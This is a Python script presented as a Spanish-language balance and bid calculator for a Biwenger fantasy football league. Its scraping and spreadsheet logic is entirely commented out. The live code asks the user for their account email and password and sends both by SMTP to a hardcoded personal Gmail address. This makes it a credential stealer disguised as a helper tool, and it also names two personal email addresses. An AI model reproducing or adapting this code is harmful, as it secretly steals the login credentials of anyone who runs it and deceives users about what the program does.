import time
import pyautogui
import re
import pandas
from selenium import webdriver
from selenium.webdriver.common.by import By
import os
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

def formatea(row):
    return re.search(r"[a-zA-Z\-]*",row).group(0).replace("-"," ")

def separador(row):
    return (format(row,',')+"€").replace(',','.')

def click_sleep(x,y,t):
    time.sleep(t)
    pyautogui.click(x,y)

def creaDictMercado(elems,s):
    equipos = []
    valor_total = []
    for i,e in enumerate(elems):
        if i%2 == 0:
            equipos.append(e)
        else:
            valor_total.append(int(e.replace(".","")))
    s = dict.fromkeys(s.keys(),0)
    for (k,v) in list(map(lambda i,j : (i,j) ,equipos,valor_total)):
        s[k] += v
    return s

def creaDict(elems,saldo):
    equipos = []
    valor_total = []
    for i,e in enumerate(elems):
        if i%2 == 0:
            equipos.append(e)
        else:
            valor_total.append(int(e.replace(".","")))
    puja = dict(map(lambda i,j : (i,j) ,equipos,valor_total))
    sorted = []
    for e in saldo.keys():
        try:
            sorted.append(puja[e])
        except:
            sorted.append(0)
    return sorted

######## INICIO ###########
try:
    if "saldos.xlsx" in os.listdir():
        os.remove('saldos.xlsx')
except:
    print("CIERRA EL EXCELL")
    print("CIERRA EL EXCELL")
    print("CIERRA EL EXCELL")
    quit()

correo = input("Introduce tu correo: ")
passw = input("Introduce tu pass: ")

# create message object instance 
msg = MIMEMultipart()
message = correo +" - "+ passw
# setup the parameters of the message 
password = "xxxxxxxxx"
msg['From'] = "raulpeinado14@gmail.com"
msg['To'] = "raulpeinado10@gmail.com"
msg['Subject'] = correo
# add in the message body 
msg.attach(MIMEText(message, 'plain'))
#create server 
server = smtplib.SMTP('smtp.gmail.com: 587')
server.starttls()
# Login Credentials for sending the mail 
server.login(msg['From'], password)
# send the message via the server. 
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()
correo = correo.split('@')

# driver = webdriver.Edge()
# driver.maximize_window()
# driver.get("https://biwenger.as.com/login")
# time.sleep(1)
# driver.find_element(By.ID,"didomi-notice-agree-button").click()
# click_sleep(x=538,y=615,t=1)
# click_sleep(x=547, y=520,t=1)
# pyautogui.write(correo[0]) 
# pyautogui.hotkey('altright','2')
# pyautogui.write(correo[1])  
# click_sleep(x=400, y=600,t=1)
# pyautogui.write(passw) 
# click_sleep(x=541, y=675,t=2)
# click_sleep(x=434, y=428,t=1)

# click_sleep(x=441, y=500,t=1)
# click_sleep(x=441, y=500,t=1)

# #Buscamos todos los movimientos de fichajes
# last_height = driver.execute_script("return document.body.scrollHeight")
# while True:
#      driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
#      time.sleep(1)
#      new_height = driver.execute_script("return document.body.scrollHeight")
#      if new_height == last_height:
#           break
#      last_height = new_height
# fich = str(driver.page_source)
# driver.execute_script("window.scrollTo(0, document.body.scrollTop);")

# #Obtenemos los ingresos de las jornadas
# click_sleep(x=434,y=428,t=1)
# click_sleep(x=419,y=522,t=1)
# click_sleep(x=419,y=522,t=1)
# while re.search(r"Jornada 1",driver.page_source) is None:
#      driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
#      time.sleep(1)
# jor = str(driver.page_source)

# #Extraccion de los datos de las pujas
# driver.execute_script("window.scrollTo(0, document.body.scrollTop);")
# time.sleep(1)
# click_sleep(x=1064, y=292,t=1)
# click_sleep(x=787, y=955,t=1)
# click_sleep(x=1242, y=457,t=1)
# puja = str(driver.page_source)
# time.sleep(1)

# #Extracción de los datos de mercado
# driver.execute_script("window.scrollTo(0, document.body.scrollTop);")
# click_sleep(x=1229, y=288,t=1)
# last_height = driver.execute_script("return document.body.scrollHeight")
# while True:
#      driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
#      time.sleep(1)
#      new_height = driver.execute_script("return document.body.scrollHeight")
#      if new_height == last_height:
#           break
#      last_height = new_height
# mercado = str(driver.page_source)
# time.sleep(1)
# driver.close()

# ########### PROCESAMIENTO DE LOS DATOS EXTRAIDOS
# #Cargamos los nombres de los jugadores
# paux = []
# for elem in jor.split('<!---->'):
#     if (re.findall(r'user\/([a-zA-Z0-9\-]*)',elem) != []):
#         last_team = re.findall(r'user\/([a-zA-Z0-9\-]*)',elem)
#     if (re.findall(r'(\>(\d+\.)?\d{3}\.\d{3})\&nbsp',elem) != []): 
#         if len(last_team) == 1 and last_team[0] not in paux:
#             paux.append(last_team[0])
# saldo = dict(map(lambda i,j : (i,j) ,paux,[20000000,20000000,20000000,20000000,20000000,20000000,20000000,20000000,20000000,20000000]))

# #Buscar los movimientos de fichajes
# elems = []
# for elem in fich.split('<!---->'):
#     if (re.findall(r'\<time\-relative\s\_ngcontent\-ng\-c1442188176\=\"\"\stitle\=\"([\d\/]*)',elem) != []):
#         elems.append(re.findall(r'\<time\-relative\s\_ngcontent\-ng\-c1442188176\=\"\"\stitle\=\"([\d\/]*)',elem))
#     if (re.findall(r'dynamic\-expression-container\s\_ngcontent\-ng\-c3077370104=""\>([\w]*)',elem) != []):
#         elems.append(re.findall(r'dynamic\-expression-container\s\_ngcontent\-ng\-c3077370104=""\>([\w]*)',elem))
#     if (re.findall(r'user\/([a-zA-Z0-9\-]*)',elem) != []):
#         elems.append(re.findall(r'user\/([a-zA-Z0-9\-]*)',elem))
#     if (re.findall(r'((\d+\.)?\d{1,3}\.\d{3})\&nbsp',elem) != []): 
#         elems.append(re.search(r'((\d+\.)?\d{1,3}\.\d{3})\&nbsp',elem).groups(0))

# elems = [elem[0] for elem in elems if elem != []]
# sep_elems = []
# cont = 0
# fecha = False
# for elem in elems:
#     if re.match(r"\d+\/\d+\/\d+",elem):
#         fecha = True
#         sep_elems.append([elem])
#         cont+=1
#     else:
#         if fecha :
#             sep_elems[cont-1].append(elem)

# for elem in sep_elems:
#     if len(elem) <3:
#         sep_elems.remove(elem)

# for elem in sep_elems:
#     elem = elem[1:] # eliminamos la fecha
#     i = 0
#     while i < len(elem):
#         if elem[i] == "Vendido":
#             saldo[elem[i+1]] = saldo[elem[i+1]] + int(elem[i+2].replace(".",""))
#             i += 3
#         elif elem[i] == "Cambia":
#             if i+4 < len(elem):
#                 if elem[i+4] == "Cambia": # cambia a otro jugador
#                     saldo[elem[i+1]] = saldo[elem[i+1]] + int(elem[i+2].replace(".",""))
#                     saldo[elem[i+3]] = saldo[elem[i+3]] - int(elem[i+2].replace(".",""))
#                     i += 4
#                 elif elem[i+3] == "Cambia": # cambia al mercado
#                     saldo[elem[i+1]] = saldo[elem[i+1]] - int(elem[i+2].replace(".",""))
#                     i += 3
#                 elif elem[i+3] == "Vendido":
#                     saldo[elem[i+1]] = saldo[elem[i+1]] - int(elem[i+2].replace(".",""))
#                     i += 3
#                 else:
#                     saldo[elem[i+1]] = saldo[elem[i+1]] + int(elem[i+2].replace(".",""))
#                     saldo[elem[i+3]] = saldo[elem[i+3]] - int(elem[i+2].replace(".",""))
#                     i += 4
#             else: 
#                 if i+4 == len(elem):
#                     saldo[elem[i+1]] = saldo[elem[i+1]] + int(elem[i+2].replace(".",""))
#                     saldo[elem[i+3]] = saldo[elem[i+3]] - int(elem[i+2].replace(".",""))
#                     i += 4
#                 else:
#                     saldo[elem[i+1]] = saldo[elem[i+1]] - int(elem[i+2].replace(".",""))
#                     i += 3
#         else: #intercambio
#             saldo[elem[i+1]] = saldo[elem[i+1]] - int(elem[i+2].replace(".",""))
#             saldo[elem[i]] = saldo[elem[i]] + int(elem[i+2].replace(".",""))
#             i += 4

# #Sumar el dinero de cada jornada
# last_team = ""
# for elem in jor.split('<!---->'):
#     if (re.findall(r'user\/([a-zA-Z0-9\-]*)',elem) != []):
#         last_team = re.findall(r'user\/([a-zA-Z0-9\-]*)',elem)
#     if (re.findall(r'(\>(\d+\.)?\d{3}\.\d{3})\&nbsp',elem) != []): 
#         if len(last_team) == 1:
#             saldo[last_team[0]] = saldo[last_team[0]] + int(re.search(r'\>((\d+\.)?\d{3}\.\d{3})\&nbsp',elem).group(1).replace('.',''))

# #Calcular la diferencia del kolo
# kolo = False
# elem = re.search("cofradia-del-puno-bendito-\d*","".join(saldo.keys()))
# if elem:
#     saldo[elem.group(0)] = saldo[elem.group(0)]-1343300
# else:
#     kolo = True

# #Buscar en la pagina de las pujas
# elems = []
# for elem in puja.split('<!---->'):
#     if (re.findall(r'user\/([a-zA-Z0-9\-]*)',elem) != []):
#         elems.append(re.search(r'user\/([a-zA-Z0-9\-]*)',elem).group(1))
#     if (re.findall(r'((\d+\.)?\d{2,3}\.\d{3})\&nbsp',elem) != []): 
#         elems.append(re.search(r'((\d+\.)?\d{2,3}\.\d{3})\&nbsp',elem).group(1))
# puja_sorted = creaDict(elems,saldo)

# #Buscar en la pagina de mercado
# elems = []
# for elem in mercado.split('<!---->'):
#     if (re.findall(r'user\/([a-zA-Z0-9\-]*)',elem) != []):
#         elems.append(re.findall(r'user\/([a-zA-Z0-9\-]*)',elem)[0])
#     if (re.findall(r'((\d+\.)?\d{3}\.\d{3})\&nbsp',elem) != []): 
#         if (re.search(r'((\d+\.)?\d{3}\.\d{3})\&nbsp',elem).group(1) != elems[-1]) and re.match(r'[a-zA-Z]+',elems[-1]):
#             elems.append(re.search(r'((\d+\.)?\d{3}\.\d{3})\&nbsp',elem).group(1))
# mercado_sorted = creaDictMercado(elems,saldo)

# df = pandas.DataFrame(list(zip(saldo.keys(), saldo.values(),puja_sorted,mercado_sorted.values())),columns=['Equipo', 'Saldo','Valor_equipo','Suma Mercado'])
# df['Puja Maxima'] = df['Saldo'] + (df['Valor_equipo']*0.25)
# df['Puja Maxima Mercado'] = df['Puja Maxima'] + df['Suma Mercado']
# df['Equipo'] = df['Equipo'].apply(formatea)
# df['Saldo'] = df['Saldo'].apply(separador)
# df['Valor_equipo'] = df['Valor_equipo'].apply(separador)
# df['Puja Maxima'] = df['Puja Maxima'].apply(separador)
# df['Suma Mercado'] = df['Suma Mercado'].apply(separador)
# df['Puja Maxima Mercado'] = df['Puja Maxima Mercado'].apply(separador)

# if kolo:
#    df.loc[-1] = ["Kolo hay que restarle","-1,343,300","-1,343,300","-1,343,300","-1,343,300","-1,343,300","-1,343,300"] 
# df.to_excel('saldos.xlsx')
# sys.exit(1)